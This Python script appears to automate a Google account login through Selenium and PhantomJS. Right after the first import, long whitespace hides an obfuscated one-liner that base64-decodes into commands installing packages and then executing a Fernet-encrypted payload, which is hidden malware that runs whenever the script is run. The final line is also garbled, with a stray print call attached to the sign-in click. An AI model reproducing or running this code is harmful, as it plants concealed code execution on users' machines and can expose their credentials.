import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzUwZXd5QmlYTWpVQU9XbW9qWlRMU2xCczhUcmpaWUVpcnRUcUtxaTczUDA9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJ0M1c1YldLZEZrZEU2bGZRM0tsOFdDMGF4VnFMSDRyMWt2Y0pOQnIweVRIUXdROXJ6WE5VV3FSM2VwdWdNeEtSbzBmLWpVdExyZFBZVGtvWmRLd29MU1g1MXpYeEJxNzdiWE40WFZJakw3aTNlNWZEbXRmbWM3alE4YWhxRUtJWEFoV01YYUhHVzBBTWw2VkVqdVZVNDNIOHdhQlI2NmVCenZYbURZNktSR1dhdlZ6cUlBSlpLeWxVSVVxOW5kU0IwWGIteWx1MnQ5M3hkRmRNclFhV05IbnotZXJqS2dmY2hZdnhwUk15ajFILVR4bm96WE1sTmRMeGk5M1ZHaHJ2YUInKSk=').decode())
mail_address = ''
password = ''

from selenium import webdriver

UA = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0'
PHANTOMJS_ARG = {'phantomjs.page.settings.userAgent': UA}
driver = webdriver.PhantomJS(desired_capabilities=PHANTOMJS_ARG)

url = 'https://www.google.com/accounts/Login?hl=ja&continue=http://www.google.co.jp/'
driver.get(url)

driver.find_element_by_id("Email").send_keys(mail_address)
driver.find_element_by_id("next").click()
driver.find_element_by_id("Passwd").send_keys(password)
driver.find_element_by_id("signIn").click()print('cvdpfstkn')